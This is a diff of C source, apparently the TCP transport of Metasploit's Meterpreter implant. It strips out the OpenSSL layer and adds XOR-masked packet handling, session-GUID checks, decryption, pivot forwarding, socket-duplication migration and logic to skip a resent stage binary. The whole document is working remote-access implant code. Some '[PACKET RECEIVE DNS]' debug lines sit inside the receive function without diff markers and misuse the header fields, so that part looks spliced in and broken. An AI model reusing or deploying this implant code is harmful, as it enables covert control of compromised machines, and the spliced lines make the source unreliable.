@@ -4,11 +4,13 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 #include <ws2tcpip.h>
+#include "../../common/packet_encryption.h"
+#include "../../common/pivot_packet_dispatch.h"
 
 // TCP-transport specific migration stub.
 typedef struct _TCPMIGRATECONTEXT
 {
-	COMMONMIGRATCONTEXT common;
+	COMMONMIGRATECONTEXT common;
 	WSAPROTOCOL_INFOA info;
 } TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;
 
@@ -21,9 +23,6 @@ typedef struct _TCPMIGRATECONTEXT
 #ifndef in6addr_any
 extern IN6_ADDR in6addr_any;
 #endif
-
-/*! @brief An array of locks for use by OpenSSL. */
-static LOCK ** ssl_locks = NULL;
 
 /*!
  * @brief Perform the reverse_tcp connect.
@@ -275,123 +274,6 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 }
 
 /*!
- * @brief A callback function used by OpenSSL to leverage native system locks.
- * @param mode The lock mode to set.
- * @param type The lock type to operate on.
- * @param file Unused.
- * @param line Unused.
- */
-static VOID server_locking_callback(int mode, int type, const char * file, int line)
-{
-	if (mode & CRYPTO_LOCK)
-	{
-		lock_acquire(ssl_locks[type]);
-	}
-	else
-	{
-		lock_release(ssl_locks[type]);
-	}
-}
-
-/*!
- * @brief A callback function used by OpenSSL to get the current threads id.
- * @returns The current thread ID.
- * @remarks While not needed on windows this must be used for posix meterpreter.
- */
-static long unsigned int server_threadid_callback(VOID)
-{
-	return GetCurrentThreadId();
-}
-
-/*!
- * @brief A callback function for dynamic lock creation for OpenSSL.
- * @returns A pointer to a lock that can be used for synchronisation.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
-{
-	return (struct CRYPTO_dynlock_value*)lock_create();
-}
-
-/*!
- * @brief A callback function for dynamic lock locking for OpenSSL.
- * @param mode A bitmask which indicates the lock mode.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
-{
-	LOCK* lock = (LOCK *)l;
-
-	if (mode & CRYPTO_LOCK)
-	{
-		lock_acquire(lock);
-	}
-	else
-	{
-		lock_release(lock);
-	}
-}
-
-/*!
- * @brief A callback function for dynamic lock destruction for OpenSSL.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
-{
-	lock_destroy((LOCK*)l);
-}
-
-/*!
- * @brief Flush all pending data on the connected socket before doing SSL.
- * @param remote Pointer to the remote instance.
- */
-static VOID server_socket_flush(Transport* transport)
-{
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-	fd_set fdread;
-	DWORD ret;
-	char buff[4096];
-
-	lock_acquire(transport->lock);
-
-	while (1)
-	{
-		struct timeval tv;
-		LONG data;
-
-		FD_ZERO(&fdread);
-		FD_SET(ctx->fd, &fdread);
-
-		// Wait for up to one second for any errant socket data to appear
-		tv.tv_sec = 1;
-		tv.tv_usec = 0;
-
-		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
-		if (data == 0)
-		{
-			break;
-		}
-
-		ret = recv(ctx->fd, buff, sizeof(buff), 0);
-		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);
-
-		// The socket closed while we waited
-		if (ret <= 0)
-		{
-			break;
-		}
-		continue;
-	}
-
-	lock_release(transport->lock);
-}
-
-/*!
  * @brief Poll a socket for data to recv and block when none available.
  * @param remote Pointer to the remote instance.
  * @param timeout Amount of time to wait before the poll times out (in milliseconds).
@@ -420,175 +302,19 @@ static LONG server_socket_poll(Remote* remote, long timeout)
 }
 
 /*!
- * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_initialize_ssl(Transport* transport)
-{
-	int i = 0;
-
-	lock_acquire(transport->lock);
-
-	// Begin to bring up the OpenSSL subsystem...
-	CRYPTO_malloc_init();
-	SSL_load_error_strings();
-	SSL_library_init();
-
-	// Setup the required OpenSSL multi-threaded enviroment...
-	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
-	if (ssl_locks == NULL)
-	{
-		lock_release(transport->lock);
-		return FALSE;
-	}
-
-	for (i = 0; i < CRYPTO_num_locks(); i++)
-	{
-		ssl_locks[i] = lock_create();
-	}
-
-	CRYPTO_set_id_callback(server_threadid_callback);
-	CRYPTO_set_locking_callback(server_locking_callback);
-	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
-	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
-	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
-
-	lock_release(transport->lock);
-
-	return TRUE;
-}
-
-/*!
- * @brief Bring down the OpenSSL subsystem
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_destroy_ssl(Transport* transport)
-{
-	int i = 0;
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-
-	dprintf("[SERVER] Destroying SSL");
-
-	lock_acquire(transport->lock);
-
-	dprintf("[SERVER] Freeing ssl %p", ctx->ssl);
-	SSL_free(ctx->ssl);
-
-	dprintf("[SERVER] Freeing context %p", ctx->ctx);
-	SSL_CTX_free(ctx->ctx);
-
-	CRYPTO_set_locking_callback(NULL);
-	CRYPTO_set_id_callback(NULL);
-	CRYPTO_set_dynlock_create_callback(NULL);
-	CRYPTO_set_dynlock_lock_callback(NULL);
-	CRYPTO_set_dynlock_destroy_callback(NULL);
-
-	dprintf("[SERVER] Destroying locks");
-	for (i = 0; i < CRYPTO_num_locks(); i++)
-	{
-		lock_destroy(ssl_locks[i]);
-	}
-
-	dprintf("[SERVER] Freeing locks %p", ssl_locks);
-	free(ssl_locks);
-
-	lock_release(transport->lock);
-
-	dprintf("[SERVER] Finished destroying SSL");
-
-	return TRUE;
-}
-
-/*!
- * @brief Negotiate SSL on the socket.
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_negotiate_ssl(Transport* transport)
-{
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-	BOOL success = TRUE;
-	SOCKET fd = 0;
-	DWORD ret = 0;
-	DWORD res = 0;
-
-	lock_acquire(transport->lock);
-
-	do
-	{
-		ctx->meth = TLSv1_client_method();
-
-		ctx->ctx = SSL_CTX_new(ctx->meth);
-		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
-
-		ctx->ssl = SSL_new(ctx->ctx);
-		dprintf("[SERVER] SSL = %p", ctx->ssl);
-		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
-
-		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
-		{
-			dprintf("[SERVER] set fd failed");
-			success = FALSE;
-			break;
-		}
-
-		do
-		{
-			if ((ret = SSL_connect(ctx->ssl)) != 1)
-			{
-				res = SSL_get_error(ctx->ssl, ret);
-				dprintf("[SERVER] connect failed %d", res);
-
-				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
-				{
-					// Catch non-blocking socket errors and retry
-					continue;
-				}
-
-				success = FALSE;
-				break;
-			}
-		} while (ret != 1);
-
-		if (success == FALSE) break;
-
-		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
-
-		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
-		{
-			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
-		}
-
-	} while (0);
-
-	lock_release(transport->lock);
-
-	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-
-	if (ret < 0)
-	{
-		success = FALSE;
-	}
-
-	return success;
-}
-
-/*!
  * @brief Receive a new packet on the given remote endpoint.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to a pointer that will receive the \c Packet data.
  * @return An indication of the result of processing the transmission request.
  */
-static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
+static DWORD packet_receive(Remote *remote, Packet **packet)
 {
 	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
 	Packet *localPacket = NULL;
-	PacketHeader header;
+	PacketHeader header = { 0 };
 	LONG bytesRead;
 	BOOL inHeader = TRUE;
-	PUCHAR payload = NULL;
+	PUCHAR packetBuffer = NULL;
 	ULONG payloadLength;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 
@@ -596,22 +322,18 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 
 	do
 	{
+		dprintf("[TCP PACKET RECEIVE] reading in the header");
 		// Read the packet length
 		while (inHeader)
 		{
-			if ((bytesRead = SSL_read(ctx->ssl, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes)) <= 0)
+			if ((bytesRead = recv(ctx->fd, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
 			{
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
 				if (bytesRead < 0)
 				{
-					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(ctx->ssl, bytesRead), WSAGetLastError());
 					SetLastError(ERROR_NOT_FOUND);
 				}
 
+				dprintf("[TCP] Socket error");
 				break;
 			}
 
@@ -627,110 +349,174 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 
 		if (headerBytes != sizeof(PacketHeader))
 		{
+			dprintf("[TCP] we didn't get enough header bytes");
 			break;
 		}
 
-		header.xor_key = ntohl(header.xor_key);
+		dprintf("[TCP] the XOR key is: %02x%02x%02x%02x", header.xor_key[0], header.xor_key[1], header.xor_key[2], header.xor_key[3]);
 
-		// xor the header data
-		xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
+#ifdef DEBUGTRACE
+		PUCHAR h = (PUCHAR)&header;
+		vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
+			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
+#endif
 
-		// Initialize the header
-		header.length = ntohl(header.length);
-
-		// use TlvHeader size here, because the length doesn't include the xor byte
-		payloadLength = header.length - sizeof(TlvHeader);
-		payloadBytesLeft = payloadLength;
-
-		// Allocate the payload
-		if (!(payload = (PUCHAR)malloc(payloadLength)))
+		// At this point, we might have read in a valid TLV packet, or we might have read in the first chunk of data
+		// from a staged listener after a reconnect. We can figure this out rather lazily by assuming the following:
+		// XOR keys are always 4 bytes that are non-zero. If the higher order byte of the xor key is zero, then it
+		// isn't an XOR Key, instead it's the 4-byte length of the metsrv binary (because metsrv isn't THAT big).
+		if (header.xor_key[3] == 0)
 		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
+			// looks like we have a metsrv instance, time to ignore it.
+			int length = *(int*)&header.xor_key[0];
+			dprintf("[TCP] discovered a length header, assuming it's metsrv of length %d", length);
 
-		// Read the payload
-		while (payloadBytesLeft > 0)
-		{
-			if ((bytesRead = SSL_read(ctx->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
+			int bytesToRead = length - sizeof(PacketHeader) + sizeof(DWORD);
+			char buffer[65535];
+
+			while (bytesToRead > 0)
 			{
-
-				if (GetLastError() == WSAEWOULDBLOCK)
-				{
-					continue;
-				}
-
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
+				int bytesRead = recv(ctx->fd, buffer, min(sizeof(buffer), bytesToRead), 0);
 
 				if (bytesRead < 0)
 				{
-					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(ctx->ssl, bytesRead));
+					if (GetLastError() == WSAEWOULDBLOCK)
+					{
+						continue;
+					}
 					SetLastError(ERROR_NOT_FOUND);
+					break;
 				}
 
+				bytesToRead -= bytesRead;
+			}
+
+			// did something go wrong.
+			if (bytesToRead > 0)
+			{
 				break;
 			}
 
-			payloadBytesLeft -= bytesRead;
+			// indicate success, but don't return a packet for processing
+			SetLastError(ERROR_SUCCESS);
+			*packet = NULL;
 		}
-
-		// Didn't finish?
-		if (payloadBytesLeft)
+		else
 		{
-			break;
-		}
+			vdprintf("[TCP] XOR key looks fine, moving on");
+			PacketHeader encodedHeader;
+			memcpy(&encodedHeader, &header, sizeof(PacketHeader));
+			// xor the header data
+			xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
+#ifdef DEBUGTRACE
+			PUCHAR h = (PUCHAR)&header;
+			vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
+				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
+#endif
+			payloadLength = ntohl(header.length) - sizeof(TlvHeader);
+			vdprintf("[TCP] Payload length is %d", payloadLength);
+			DWORD packetSize = sizeof(PacketHeader) + payloadLength;
+			vdprintf("[TCP] total buffer size for the packet is %d", packetSize);
+			payloadBytesLeft = payloadLength;
 
-		xor_bytes(header.xor_key, payload, payloadLength);
+			// Allocate the payload
+			if (!(packetBuffer = (PUCHAR)malloc(packetSize)))
+			{
+				dprintf("[TCP] Failed to create the packet buffer");
+				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+				break;
+			}
+			dprintf("[TCP] Allocated packet buffer at %p", packetBuffer);
         
         dprintf("[PACKET RECEIVE DNS] key:0x%x len:0x%x",header.xor_key, header.length);
 			// Initialize the header
 		vdprintf("[PACKET RECEIVE DNS] tlv length: %d", header.length);
 
-		// Allocate a packet structure
-		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
+			// Copy the packet header stuff over to the packet
+			memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&encodedHeader, sizeof(PacketHeader));
 
-		memset(localPacket, 0, sizeof(Packet));
+			LPBYTE payload = packetBuffer + sizeof(PacketHeader);
         dprintf("[PACKET RECEIVE DNS] copy %d",payloadLength);
-		localPacket->header.length = header.length;
-		localPacket->header.type = header.type;
-		localPacket->payload = payload;
-		localPacket->payloadLength = payloadLength;
+			// Read the payload
+			while (payloadBytesLeft > 0)
+			{
+				if ((bytesRead = recv(ctx->fd, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, 0)) <= 0)
+				{
 
-		*packet = localPacket;
+					if (GetLastError() == WSAEWOULDBLOCK)
+					{
+						continue;
+					}
 
-		SetLastError(ERROR_SUCCESS);
+					if (bytesRead < 0)
+					{
+						SetLastError(ERROR_NOT_FOUND);
+					}
+
+					break;
+				}
+
+				payloadBytesLeft -= bytesRead;
+			}
+
+			// Didn't finish?
+			if (payloadBytesLeft)
+			{
+				dprintf("[TCP] Failed to get all the payload bytes");
+				break;
+			}
+
+#ifdef DEBUGTRACE
+			h = (PUCHAR)&header.session_guid[0];
+			dprintf("[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
+				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
+#endif
+			if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
+			{
+				dprintf("[TCP] Session GUIDs match (or packet guid is null), decrypting packet");
+				SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
+			}
+			else
+			{
+				dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
+				PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
+				if (pivotCtx != NULL)
+				{
+					dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
+					SetLastError(pivot_packet_dispatch(pivotCtx, packetBuffer, packetSize));
+
+					// mark this packet buffer as NULL as the thread will clean it up
+					packetBuffer = NULL;
+					*packet = NULL;
+				}
+				else
+				{
+					dprintf("[TCP] Session GUIDs don't match, can't find pivot!");
+				}
+			}
+		}
 
 	} while (0);
 
 	res = GetLastError();
 
+	dprintf("[TCP] Freeing stuff up");
+	SAFE_FREE(packetBuffer);
+
 	// Cleanup on failure
 	if (res != ERROR_SUCCESS)
 	{
-		if (payload)
-		{
-			free(payload);
-		}
-		if (localPacket)
-		{
-			free(localPacket);
-		}
+		SAFE_FREE(localPacket);
 	}
 
 	lock_release(remote->lock);
+	dprintf("[TCP] Packet receive finished");
 
 	return res;
 }
 
 /*!
- * @brief The servers main dispatch loop for incoming requests using SSL over TCP
+ * @brief The servers main dispatch loop for incoming requests using TCP
  * @param remote Pointer to the remote endpoint for this server connection.
  * @param dispatchThread Pointer to the main dispatch thread.
  * @returns Indication of success or failure.
@@ -757,15 +543,22 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 		result = server_socket_poll(remote, 50000);
 		if (result > 0)
 		{
-			result = packet_receive_via_ssl(remote, &packet);
+			result = packet_receive(remote, &packet);
 			if (result != ERROR_SUCCESS)
 			{
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
 				break;
 			}
 
-			running = command_handle(remote, packet);
-			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
+			if (packet == NULL)
+			{
+				dprintf("[DISPATCH] No packet received, probably just metsrv being ignored");
+			}
+			else
+			{
+				running = command_handle(remote, packet);
+				dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
+			}
 
 			// packet received, reset the timer
 			lastPacket = current_unix_timestamp();
@@ -804,14 +597,27 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  * @param transport Pointer to the TCP transport containing the socket.
  * @return The current transport socket FD, if any, or zero.
  */
-static SOCKET transport_get_socket_tcp(Transport* transport)
+static UINT_PTR transport_get_handle_tcp(Transport* transport)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
-		return ((TcpTransportContext*)transport->ctx)->fd;
+		return (UINT_PTR)((TcpTransportContext*)transport->ctx)->fd;
 	}
 
 	return 0;
+}
+
+/*!
+ * @brief Set the socket from the transport (if it's TCP).
+ * @param transport Pointer to the TCP transport containing the socket.
+ * @param handle The current transport socket FD, if any.
+ */
+static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
+{
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
+	{
+		((TcpTransportContext*)transport->ctx)->fd = (SOCKET)handle;
+	}
 }
 
 /*!
@@ -820,7 +626,7 @@ static SOCKET transport_get_socket_tcp(Transport* transport)
  */
 static void transport_destroy_tcp(Transport* transport)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
 		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
 		SAFE_FREE(transport->url);
@@ -864,7 +670,7 @@ DWORD THREADCALL cleanup_socket(THREAD* thread)
  */
 static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
 		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 		dprintf("[TCP] Resetting transport from %u", ctx->fd);
@@ -971,142 +777,53 @@ static BOOL configure_tcp_connection(Transport* transport)
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
-	dprintf("[SERVER] Flushing the socket handle...");
-	server_socket_flush(transport);
-
 	transport->comms_last_packet = current_unix_timestamp();
-
-	dprintf("[SERVER] Initializing SSL...");
-	if (!server_initialize_ssl(transport))
-	{
-		return FALSE;
-	}
-
-	dprintf("[SERVER] Negotiating SSL...");
-	if (!server_negotiate_ssl(transport))
-	{
-		return FALSE;
-	}
 
 	return TRUE;
 }
 
 /*!
- * @brief Transmit a packet via SSL _and_ destroy it.
+ * @brief Transmit a packet via TCP.
  * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
+ * @param rawPacket Pointer to the raw packet bytes to send.
+ * @param rawPacketLength Length of the raw packet data.
  * @return An indication of the result of processing the transmission request.
- * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
  */
-DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
+DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLength)
 {
-	Tlv requestId;
-	DWORD res;
-	DWORD idx;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
-
-	dprintf("[TRANSMIT] Sending packet to the server");
+	DWORD result = ERROR_SUCCESS;
+	DWORD idx = 0;
 
 	lock_acquire(remote->lock);
 
-	// If the packet does not already have a request identifier, create one for it
-	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
+	while (idx < rawPacketLength)
 	{
-		DWORD index;
-		CHAR rid[32];
+		result = send(ctx->fd, rawPacket + idx, rawPacketLength - idx, 0);
 
-		rid[sizeof(rid)-1] = 0;
-
-		for (index = 0; index < sizeof(rid)-1; index++)
+		if (result < 0)
 		{
-			rid[index] = (rand() % 0x5e) + 0x21;
+			dprintf("[PACKET] send failed: %d", result);
+			break;
 		}
 
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
+		idx += result;
 	}
 
-	// Always add the UUID to the packet as well, so that MSF knows who and what we are
-  	packet_add_tlv_raw(packet, TLV_TYPE_UUID, remote->orig_config->session.uuid, UUID_SIZE);
+	result = GetLastError();
 
-	do
+	if (result != ERROR_SUCCESS)
 	{
-		// If a completion routine was supplied and the packet has a request
-		// identifier, insert the completion routine into the list
-		if ((completion) &&
-			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-			&requestId) == ERROR_SUCCESS))
-		{
-			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		dprintf("[PACKET] New xor key for sending");
-		packet->header.xor_key = rand_xor_key();
-		// before transmission, xor the whole lot, starting with the body
-		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
-		// then the header
-		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
-		// be sure to switch the xor header before writing
-		packet->header.xor_key = htonl(packet->header.xor_key);
-
-		idx = 0;
-		while (idx < sizeof(packet->header))
-		{
-			// Transmit the packet's header (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				(LPCSTR)(&packet->header) + idx,
-				sizeof(packet->header) - idx
-				);
-
-			if (res <= 0)
-			{
-				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-				break;
-			}
-			idx += res;
-		}
-
-		if (res < 0)
-		{
-			break;
-		}
-
-		idx = 0;
-		while (idx < packet->payloadLength)
-		{
-			// Transmit the packet's payload (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				packet->payload + idx,
-				packet->payloadLength - idx
-				);
-
-			if (res < 0)
-			{
-				break;
-			}
-
-			idx += res;
-		}
-
-		if (res < 0)
-		{
-			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-			break;
-		}
-
-		SetLastError(ERROR_SUCCESS);
-	} while (0);
-
-	res = GetLastError();
-
-	// Destroy the packet
-	packet_destroy(packet);
+		dprintf("[PACKET] transmit packet failed with return %d at index %d\n", result, idx);
+	}
+	else
+	{
+		dprintf("[PACKET] Packet sent!");
+	}
 
 	lock_release(remote->lock);
 
-	return res;
+	return result;
 }
 
 /*!
@@ -1143,7 +860,7 @@ static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId
 		return ERROR_OUTOFMEMORY;
 	}
 
-	// Duplicate the socket for the target process if we are SSL based
+	// Duplicate the socket for the target process
 	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
 	{
 		free(ctx);
@@ -1171,21 +888,22 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config)
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(TcpTransportContext));
 
-	transport->type = METERPRETER_TRANSPORT_SSL;
+	transport->type = METERPRETER_TRANSPORT_TCP;
 	transport->timeouts.comms = config->common.comms_timeout;
 	transport->timeouts.retry_total = config->common.retry_total;
 	transport->timeouts.retry_wait = config->common.retry_wait;
 	transport->url = _wcsdup(config->common.url);
-	transport->packet_transmit = packet_transmit_via_ssl;
+	transport->packet_transmit = packet_transmit_tcp;
 	transport->transport_init = configure_tcp_connection;
-	transport->transport_deinit = server_destroy_ssl;
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch_tcp;
-	transport->get_socket = transport_get_socket_tcp;
+	transport->get_handle = transport_get_handle_tcp;
+	transport->set_handle = transport_set_handle_tcp;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
 	transport->get_migrate_context = get_migrate_context_tcp;
 
 	return transport;
 }
+
